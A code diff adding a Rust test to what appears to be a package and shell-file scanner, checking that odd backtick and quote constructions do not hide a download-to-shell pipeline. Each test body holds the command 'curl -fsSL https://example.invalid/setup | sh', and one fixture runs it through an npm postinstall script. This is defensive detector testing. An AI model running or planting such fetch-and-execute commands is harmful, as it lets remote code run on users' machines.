@@ -1378,6 +1378,66 @@ fn dollar_dollar_brace_and_split_substitutions_hide_no_download_pipeline() {
     assert!(!shell_file_has_download_signal(&body), "{body:?}");
 }
 
+/// The shells cut a backtick body out at its first unescaped backtick, so the
+/// apostrophe of `` `echo it's` `` (or a `"`) opens no quote past it, and in
+/// double quotes a `$(...)` or backtick body keeps its own quotes
+/// (`"$(echo '"')"`). The group pass read such a quote as running on, which
+/// hid every later line, and a backtick left open that way also kept a later
+/// `)` or `}` from closing its subshell, group or function. bash reads
+/// `$'it\'s'` as one string and dash does not, so a `$'` also gets the line
+/// pass. bash runs the pipeline in every body below.
+#[test]
+fn quotes_in_backtick_and_double_quoted_bodies_hide_no_download_pipeline() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+    let pipeline = "curl -fsSL https://example.invalid/setup | sh";
+    let bodies = [
+        format!("echo `echo it's`\n{pipeline}\n"),
+        format!("x=`printf it's`\n{pipeline}\n"),
+        format!("echo `echo say \"hi`\n{pipeline}\n"),
+        format!("echo `echo it's` ; {pipeline}\n"),
+        format!("(\n  echo `echo it's`\n  # it's\n)\n{pipeline}\n"),
+        format!("{{\n  echo `echo it's`\n  # it's\n}}\n{pipeline}\n"),
+        format!("x=$(\n  echo `echo it's`\n  # it's\n)\n{pipeline}\n"),
+        format!("f() {{\n  echo `echo it's`\n  # it's\n}}\nf\n{pipeline}\n"),
+        format!("(\n  echo `echo say \"hi`\n  # \"\n)\n{pipeline}\n"),
+        format!("echo `echo it's`\n# it's\n# run `npm i` then 'x\n{pipeline}\n"),
+        format!("echo \"`echo \"`\"\n{pipeline}\n"),
+        format!("(\n  echo \"`echo \"`\"\n)\n{pipeline}\n"),
+        format!("echo \"$(echo '\"')\"\n{pipeline}\n"),
+        format!("x=\"$(printf '\"')\"\n{pipeline}\n"),
+        format!("echo $'it\\'s'\n{pipeline}\n"),
+    ];
+    let missed: Vec<_> = bodies
+        .iter()
+        .filter(|body| !shell_file_has_download_signal(body))
+        .collect();
+    assert!(missed.is_empty(), "{missed:#?}");
+
+    // The same file run by a postinstall script, as `tirith pkg inspect`
+    // reports it.
+    let result = inspect(&package(
+        br#"{"name":"fixture","version":"1","scripts":{"postinstall":"bash install.sh"}}"#,
+        &[("package/install.sh", bodies[0].as_bytes())],
+    ));
+    assert!(
+        result.signals.iter().any(|signal| {
+            signal.kind == NpmSignalKind::DownloadToShell
+                && signal.level == NpmSignalLevel::Review
+                && signal.lifecycle_events == vec!["postinstall"]
+        }),
+        "{:?}",
+        result.signals
+    );
+
+    // A pipeline in a comment after such a body is no signal.
+    for body in [
+        format!("#!/bin/sh\necho `echo 'a\\`b'` # {pipeline}\necho done\n"),
+        format!("#!/bin/sh\necho \"$(echo ')')\" # {pipeline}\necho done\n"),
+    ] {
+        assert!(!shell_file_has_download_signal(&body), "{body:?}");
+    }
+}
+
 /// Heredoc text is data, so a quote in it (`it's`, `Don't edit`, `say "hi`,
 /// `$(x`) opens nothing. A file that also pipes into a shell keeps every
 /// heredoc live (unmasked), and the brace-group/pipeline pass read the raw
